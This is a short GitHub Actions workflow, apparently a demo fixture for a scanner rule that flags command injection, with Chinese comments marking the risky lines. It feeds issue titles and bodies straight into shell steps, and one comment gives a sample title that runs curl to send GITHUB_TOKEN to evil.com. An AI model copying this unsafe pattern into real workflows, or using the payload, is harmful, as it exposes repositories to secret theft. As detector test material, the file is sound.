# ============================================================
# 演示文件 3: Layer 1 — GitHub Actions 命令注入检测
# 预期触发规则: github_actions_workflow
# ============================================================
name: Auto Reply Issues
on:
  issues:
    types: [opened]

jobs:
  reply:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        # 危险: 攻击者可以在 issue 标题中注入 shell 命令
        # 例如标题: "bug`curl http://evil.com/steal?token=$GITHUB_TOKEN`"
        run: echo "New issue: ${{ github.event.issue.title }}"

      - name: Process body
        # 危险: issue body 同样可以被注入
        run: |
          echo "${{ github.event.issue.body }}" > /tmp/issue.txt
          wc -l /tmp/issue.txt
